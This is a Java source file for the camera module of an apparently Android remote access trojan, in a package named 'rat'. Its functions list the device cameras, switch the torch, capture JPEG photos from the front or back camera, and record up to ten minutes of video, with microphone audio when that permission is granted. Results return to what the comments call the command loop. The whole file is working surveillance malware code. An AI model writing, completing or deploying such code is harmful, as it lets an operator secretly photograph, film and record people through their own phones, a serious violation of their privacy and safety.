package com.darkbiit.rat;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureFailure;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Size;
import android.view.Surface;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Camera control: photo capture, video recording and torch.
 *
 * Uses Camera2 directly. Everything runs on a background handler thread, and
 * every entry point returns a result map instead of throwing, so a device
 * without a camera (or one where the app was denied CAMERA) degrades to an
 * explicit error rather than killing the command loop.
 */
public final class RatCamera {

    private RatCamera() {
    }

    /** Lists the cameras of the device with their facing and output sizes. */
    public static Map<String, Object> list(Context ctx) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        List<Object> cams = new ArrayList<Object>();
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) {
                out.put("ok", false);
                out.put("error", "no camera service");
                return out;
            }
            for (String id : cm.getCameraIdList()) {
                Map<String, Object> one = new LinkedHashMap<String, Object>();
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                one.put("id", id);
                one.put("facing", facing == null ? "unknown"
                        : (facing == CameraCharacteristics.LENS_FACING_FRONT ? "front" : "back"));
                Boolean flash = ch.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                one.put("flash", flash != null && flash);

                List<Object> sizes = new ArrayList<Object>();
                StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (map != null) {
                    Size[] arr = map.getOutputSizes(ImageFormat.JPEG);
                    if (arr != null) {
                        for (Size s : arr) {
                            Map<String, Object> sz = new LinkedHashMap<String, Object>();
                            sz.put("w", s.getWidth());
                            sz.put("h", s.getHeight());
                            sizes.add(sz);
                        }
                    }
                }
                one.put("jpeg_sizes", sizes);
                cams.add(one);
            }
            out.put("ok", true);
            out.put("cameras", cams);
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return out;
    }

    /** Turns the torch on or off. */
    public static Map<String, Object> torch(Context ctx, String facing, boolean on) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String id = findCamera(ctx, cm, facing);
            if (id == null) {
                out.put("ok", false);
                out.put("error", "no " + facing + " camera");
                return out;
            }
            CameraCharacteristics ch = cm.getCameraCharacteristics(id);
            Boolean flash = ch.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
            if (flash == null || !flash) {
                out.put("ok", false);
                out.put("error", "camera has no flash");
                return out;
            }
            cm.setTorchMode(id, on);
            out.put("ok", true);
            out.put("camera", id);
            out.put("torch", on);
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return out;
    }

    /**
     * Captures a still image and writes it to outPath (JPEG).
     * facing is "front" or "back".
     */
    public static Map<String, Object> takePhoto(Context ctx, String facing, String outPath) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        if (!hasCameraPermission(ctx)) {
            out.put("ok", false);
            out.put("error", "CAMERA permission not granted");
            return out;
        }

        final CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        final String id = findCamera(ctx, cm, facing);
        if (id == null) {
            out.put("ok", false);
            out.put("error", "no " + facing + " camera");
            return out;
        }

        // The JPEG size must be one the camera actually supports, and even
        // then a specific size can fail on the native window ("No such
        // device"). Candidate sizes are tried in order until one delivers.
        List<Size> candidates = jpegSizes(cm, id);
        if (candidates.isEmpty()) {
            out.put("ok", false);
            out.put("error", "camera reports no JPEG output sizes");
            return out;
        }

        for (Size jpegSize : candidates) {
            Map<String, Object> attempt = captureWithSize(ctx, cm, id, jpegSize, outPath);
            if (attempt != null) {
                attempt.put("camera", id);
                attempt.put("size", jpegSize.getWidth() + "x" + jpegSize.getHeight());
                out.putAll(attempt);
                return out;
            }
        }
        out.put("ok", false);
        out.put("error", "no JPEG size produced an image on this camera");
        return out;
    }

    /** Captures one still with a specific size; returns null on failure. */
    private static Map<String, Object> captureWithSize(Context ctx, CameraManager cm,
                                                       final String id, final Size jpegSize,
                                                       String outPath) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        if (!hasCameraPermission(ctx)) {
            out.put("ok", false);
            out.put("error", "CAMERA permission not granted");
            return out;
        }

        final File target = new File(outPath);
        final android.media.ImageReader reader = android.media.ImageReader.newInstance(
                jpegSize.getWidth(), jpegSize.getHeight(), ImageFormat.JPEG, 2);
        final CountDownLatch opened = new CountDownLatch(1);
        final CountDownLatch captured = new CountDownLatch(1);
        final CameraDevice[] device = new CameraDevice[1];
        final CameraCaptureSession[] session = new CameraCaptureSession[1];
        final Throwable[] failure = new Throwable[1];
        final android.hardware.camera2.CaptureFailure[] failure0 =
                new CaptureFailure[1];

        HandlerThread ht = new HandlerThread("rat-cam");
        ht.start();
        final Handler handler = new Handler(ht.getLooper());

        try {
            cm.openCamera(id, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice d) {
                    device[0] = d;
                    opened.countDown();
                }

                @Override
                public void onDisconnected(CameraDevice d) {
                    failure[0] = new IllegalStateException("camera disconnected");
                    opened.countDown();
                }

                @Override
                public void onError(CameraDevice d, int error) {
                    failure[0] = new IllegalStateException("camera error " + error);
                    opened.countDown();
                }
            }, handler);

            if (!opened.await(10, TimeUnit.SECONDS)) {
                out.put("ok", false);
                out.put("error", "camera open timed out");
                return out;
            }
            if (failure[0] != null) {
                out.put("ok", false);
                out.put("error", String.valueOf(failure[0].getMessage()));
                return out;
            }

            final CameraDevice cam = device[0];
            final List<Surface> surfaces = new ArrayList<Surface>();
            surfaces.add(reader.getSurface());

            cam.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession s) {
                    session[0] = s;
                    try {
                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        b.set(CaptureRequest.JPEG_ORIENTATION, 0);
                        s.capture(b.build(), new CameraCaptureSession.CaptureCallback() {
                            @Override
                            public void onCaptureCompleted(CameraCaptureSession s,
                                                          CaptureRequest r,
                                                          TotalCaptureResult result) {
                                captured.countDown();
                            }

                            @Override
                            public void onCaptureFailed(CameraCaptureSession s,
                                                        CaptureRequest r,
                                                        CaptureFailure failure) {
                                failure0[0] = failure;
                                captured.countDown();
                            }
                        }, handler);
                    } catch (Throwable t) {
                        failure[0] = t;
                        captured.countDown();
                    }
                }

                @Override
                public void onConfigureFailed(CameraCaptureSession s) {
                    failure[0] = new IllegalStateException("capture session configure failed");
                    captured.countDown();
                }
            }, handler);

            if (!captured.await(15, TimeUnit.SECONDS)) {
                return null;
            }
            if (failure[0] != null) {
                return null;
            }
            if (failure0[0] != null) {
                return null;
            }

            android.media.Image image = null;
            // The JPEG arrives asynchronously; give the reader a moment.
            long deadline = System.currentTimeMillis() + 5000;
            while (image == null && System.currentTimeMillis() < deadline) {
                image = reader.acquireNextImage();
                if (image == null) {
                    Thread.sleep(50);
                }
            }
            if (image == null) {
                return null;
            }
            try {
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                android.media.Image.Plane[] planes = image.getPlanes();
                java.nio.ByteBuffer buf = planes[0].getBuffer();
                byte[] b = new byte[buf.remaining()];
                buf.get(b);
                bos.write(b);
                byte[] jpeg = bos.toByteArray();

                File parent = target.getParentFile();
                if (parent != null && !parent.exists()) {
                    //noinspection ResultOfMethodCallIgnored
                    parent.mkdirs();
                }
                java.io.FileOutputStream fos = new java.io.FileOutputStream(target);
                try {
                    fos.write(jpeg);
                    fos.flush();
                } finally {
                    fos.close();
                }
                out.put("ok", true);
                out.put("path", target.getAbsolutePath());
                out.put("size", jpeg.length);
            } finally {
                image.close();
            }
        } catch (Throwable t) {
            RatLog.w("photo capture failed: " + t.getClass().getSimpleName()
                    + ": " + t.getMessage());
            return null;
        } finally {
            try {
                reader.close();
            } catch (Throwable ignored) {
                // nothing to do
            }
            if (session[0] != null) {
                try {
                    session[0].close();
                } catch (Throwable ignored) {
                    // nothing to do
                }
            }
            if (device[0] != null) {
                try {
                    device[0].close();
                } catch (Throwable ignored) {
                    // nothing to do
                }
            }
            ht.quitSafely();
        }
        return out;
    }

    /**
     * Records a video for the given number of seconds.
     * The microphone is attached when RECORD_AUDIO is granted.
     */
    public static Map<String, Object> recordVideo(Context ctx, String facing, String outPath, int seconds) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        if (!hasCameraPermission(ctx)) {
            out.put("ok", false);
            out.put("error", "CAMERA permission not granted");
            return out;
        }
        if (seconds < 1) {
            seconds = 10;
        }
        if (seconds > 600) {
            seconds = 600;
        }

        final CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        final String id = findCamera(ctx, cm, facing);
        if (id == null) {
            out.put("ok", false);
            out.put("error", "no " + facing + " camera");
            return out;
        }

        final MediaRecorder recorder = new MediaRecorder();
        final CountDownLatch opened = new CountDownLatch(1);
        final CountDownLatch configured = new CountDownLatch(1);
        final CameraDevice[] device = new CameraDevice[1];
        final CameraCaptureSession[] session = new CameraCaptureSession[1];
        final Throwable[] failure = new Throwable[1];
        final File target = new File(outPath);

        HandlerThread ht = new HandlerThread("rat-cam-vid");
        ht.start();
        final Handler handler = new Handler(ht.getLooper());

        try {
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            if (ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO)
                    == PackageManager.PERMISSION_GRANTED) {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            }
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setOutputFile(target.getAbsolutePath());
            recorder.setVideoSize(1280, 720);
            recorder.setVideoEncodingBitRate(4 * 1024 * 1024);
            recorder.setVideoFrameRate(30);
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            if (ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO)
                    == PackageManager.PERMISSION_GRANTED) {
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setAudioSamplingRate(44100);
                recorder.setAudioEncodingBitRate(96000);
            }
            recorder.prepare();

            cm.openCamera(id, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice d) {
                    device[0] = d;
                    opened.countDown();
                }

                @Override
                public void onDisconnected(CameraDevice d) {
                    failure[0] = new IllegalStateException("camera disconnected");
                    opened.countDown();
                }

                @Override
                public void onError(CameraDevice d, int error) {
                    failure[0] = new IllegalStateException("camera error " + error);
                    opened.countDown();
                }
            }, handler);

            if (!opened.await(10, TimeUnit.SECONDS)) {
                out.put("ok", false);
                out.put("error", "camera open timed out");
                return out;
            }
            if (failure[0] != null) {
                out.put("ok", false);
                out.put("error", String.valueOf(failure[0].getMessage()));
                return out;
            }

            final CameraDevice cam = device[0];
            final Surface surface = recorder.getSurface();

            cam.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession s) {
                    session[0] = s;
                    configured.countDown();
                }

                @Override
                public void onConfigureFailed(CameraCaptureSession s) {
                    failure[0] = new IllegalStateException("session configure failed");
                    configured.countDown();
                }
            }, handler);

            if (!configured.await(10, TimeUnit.SECONDS)) {
                out.put("ok", false);
                out.put("error", "session configure timed out");
                return out;
            }
            if (failure[0] != null) {
                out.put("ok", false);
                out.put("error", String.valueOf(failure[0].getMessage()));
                return out;
            }

            recorder.start();
            CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            b.addTarget(surface);
            session[0].setRepeatingRequest(b.build(), null, handler);

            Thread.sleep(seconds * 1000L);

            try {
                session[0].stopRepeating();
                recorder.stop();
            } catch (Throwable ignored) {
                // stopping too early throws; the file may still be usable
            }

            out.put("ok", target.exists() && target.length() > 0);
            out.put("path", target.getAbsolutePath());
            out.put("size", target.length());
            out.put("seconds", seconds);
            out.put("camera", id);
            if (!out.get("ok").equals(Boolean.TRUE)) {
                out.put("error", "no video data written");
            }
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        } finally {
            try {
                recorder.reset();
                recorder.release();
            } catch (Throwable ignored) {
                // nothing to do
            }
            if (session[0] != null) {
                try {
                    session[0].close();
                } catch (Throwable ignored) {
                    // nothing to do
                }
            }
            if (device[0] != null) {
                try {
                    device[0].close();
                } catch (Throwable ignored) {
                    // nothing to do
                }
            }
            ht.quitSafely();
        }
        return out;
    }

    // ------------------------------------------------------------------

    private static boolean hasCameraPermission(Context ctx) {
        return ctx.checkSelfPermission(Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * Picks a JPEG size the camera supports, preferring the largest one that
     * does not exceed 1920x1080.
     */
    private static Size pickJpegSize(CameraManager cm, String cameraId) {
        List<Size> all = jpegSizes(cm, cameraId);
        return all.isEmpty() ? null : all.get(0);
    }

    /**
     * The JPEG sizes the camera supports, largest first but capped at
     * 1920x1080. Several sizes are returned because a specific size can fail
     * on the native window even when the camera advertises it.
     */
    private static List<Size> jpegSizes(CameraManager cm, String cameraId) {
        List<Size> out = new ArrayList<Size>();
        try {
            CameraCharacteristics ch = cm.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) {
                return out;
            }
            Size[] arr = map.getOutputSizes(ImageFormat.JPEG);
            if (arr == null) {
                return out;
            }
            List<Size> capped = new ArrayList<Size>();
            List<Size> rest = new ArrayList<Size>();
            for (Size s : arr) {
                if (s.getWidth() <= 1920 && s.getHeight() <= 1080) {
                    capped.add(s);
                } else {
                    rest.add(s);
                }
            }
            java.util.Collections.sort(capped, new java.util.Comparator<Size>() {
                @Override
                public int compare(Size a, Size b) {
                    return (b.getWidth() * b.getHeight()) - (a.getWidth() * a.getHeight());
                }
            });
            java.util.Collections.sort(rest, new java.util.Comparator<Size>() {
                @Override
                public int compare(Size a, Size b) {
                    return (b.getWidth() * b.getHeight()) - (a.getWidth() * a.getHeight());
                }
            });
            out.addAll(capped);
            out.addAll(rest);
            return out;
        } catch (Throwable t) {
            out.add(new Size(1280, 720));
            return out;
        }
    }

    /** Finds a camera id by facing; falls back to the first camera. */
    private static String findCamera(Context ctx, CameraManager cm, String facing) {
        try {
            String wanted = (facing != null && facing.toLowerCase(java.util.Locale.US).startsWith("f"))
                    ? "front" : "back";
            String first = null;
            for (String id : cm.getCameraIdList()) {
                if (first == null) {
                    first = id;
                }
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                String name = f == null ? "unknown"
                        : (f == CameraCharacteristics.LENS_FACING_FRONT ? "front" : "back");
                if (name.equals(wanted)) {
                    return id;
                }
            }
            return first;
        } catch (CameraAccessException e) {
            return null;
        } catch (Throwable t) {
            return null;
        }
    }

    /** Unused surface holder helper kept for API completeness. */
    static Surface dummySurface(SurfaceTexture st) {
        return new Surface(st);
    }
}
